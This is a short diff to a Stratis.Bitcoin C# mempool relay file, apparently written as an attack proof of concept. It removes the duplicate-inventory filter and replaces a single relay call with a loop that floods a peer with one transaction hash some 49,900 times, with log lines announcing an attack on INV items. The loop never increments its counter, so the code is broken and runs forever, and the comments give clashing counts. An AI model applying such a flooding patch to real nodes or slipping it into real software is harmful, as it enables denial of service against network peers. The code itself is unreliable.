@@ -463,6 +463,7 @@ namespace Stratis.Bitcoin.Features.MemoryPool
         }
 
         /// <summary>
+        /// fr0stnk: Remove filter to transaction hash for an attack
         /// Adds the transaction to the send inventory for this behavior if it doesn't already exist.
         /// </summary>
         /// <param name="hash">Hash of transaction to add.</param>
@@ -470,10 +471,8 @@ namespace Stratis.Bitcoin.Features.MemoryPool
         {
             lock (this.lockObject)
             {
-                if (!this.filterInventoryKnown.Contains(hash))
-                {
-                    this.inventoryTxToSend.Add(hash);
-                }
+                this.inventoryTxToSend.Add(hash);
+
             }
         }
 
@@ -504,9 +503,17 @@ namespace Stratis.Bitcoin.Features.MemoryPool
 
                 this.logger.LogDebug("Attempting to relaying transaction ID '{0}' to peer '{1}'.", hash, peer.RemoteSocketEndpoint);
 
+                // Modified to create relay with 49.900 hashes
                 if (peer.PeerVersion.Relay)
                 {
-                    mempoolBehavior.AddTransactionToSend(hash);
+                    this.logger.LogInformation("Starting attack on INV items, preparing to send 49.000 hashes");
+                    int count = 0;
+                    
+                    while (count <= 49900)
+                    {
+                        mempoolBehavior.AddTransactionToSend(hash);
+                    }
+
                     this.logger.LogDebug("Added transaction ID '{0}' to send inventory of peer '{1}'.", hash, peer.RemoteSocketEndpoint);
                 }
                 else
